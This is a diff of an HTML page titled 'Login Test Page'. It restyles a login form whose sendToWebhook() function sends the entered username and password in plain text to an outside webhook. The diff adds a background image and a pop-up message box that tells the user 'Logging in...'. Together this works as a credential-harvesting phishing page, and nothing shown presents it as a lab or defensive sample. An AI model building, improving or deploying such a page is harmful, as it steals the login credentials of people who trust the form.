@@ -5,33 +5,67 @@
   <title>Login Page</title>
   <style>
     body {
-      background: #f0f0f0;
+      background: url('https://files.catbox.moe/lwgwqj.png') no-repeat center center fixed;
+      background-size: cover;
       font-family: Arial, sans-serif;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
+      margin: 0;
     }
+
     .login-box {
-      background: white;
+      background: rgba(255, 255, 255, 0.95);
       padding: 40px;
       border-radius: 10px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
+      text-align: center;
+      position: relative;
     }
+
     .login-box h2 {
       margin-bottom: 20px;
     }
+
     .login-box input {
       width: 100%;
       padding: 10px;
       margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 5px;
     }
+
     .login-box button {
-      width: 100%;
+      width: 50%;
       padding: 10px;
       background: #007bff;
       color: white;
       border: none;
+      border-radius: 20px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+    #messageBox {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      background: #fff;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
+      padding: 15px 20px;
+      display: none;
+      z-index: 999;
+    }
+
+    #messageBox button {
+      background: transparent;
+      border: none;
+      color: #888;
+      font-size: 16px;
+      float: right;
       cursor: pointer;
     }
   </style>
@@ -41,7 +75,13 @@
     <h2>Login Test Page</h2>
     <input type="text" id="username" placeholder="Username" required>
     <input type="password" id="password" placeholder="Password" required>
+    <br>
     <button onclick="sendToWebhook()">Login</button>
+  </div>
+
+  <div id="messageBox">
+    <button onclick="closeMessageBox()">✖</button>
+    <p id="messageText">Logging in...</p>
   </div>
 
   <script>
@@ -50,7 +90,7 @@
       const password = document.getElementById('password').value;
 
       if (!username || !password) {
-        alert("Please enter both username and password.");
+        showMessage("Please enter both username and password.");
         return;
       }
 
@@ -60,19 +100,31 @@
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          content: ` **login attempt**\n 👤 username: \`${username}\`\n 🔑 password: \`${password}\``
+          content: `**Login Attempt**\nUsername: \`${username}\`\nPassword: \`${password}\``
         })
       })
       .then(response => {
         if (response.ok) {
-          alert("Logging in...");
+          showMessage("Logging in...");
         } else {
-          alert("Failed to login.");
+          showMessage("Failed to login.");
         }
       })
       .catch(error => {
         console.error("Error:", error);
+        showMessage("An error occurred.");
       });
+    }
+
+    function showMessage(msg) {
+      const box = document.getElementById('messageBox');
+      const text = document.getElementById('messageText');
+      text.textContent = msg;
+      box.style.display = 'block';
+    }
+
+    function closeMessageBox() {
+      document.getElementById('messageBox').style.display = 'none';
     }
   </script>
 </body>
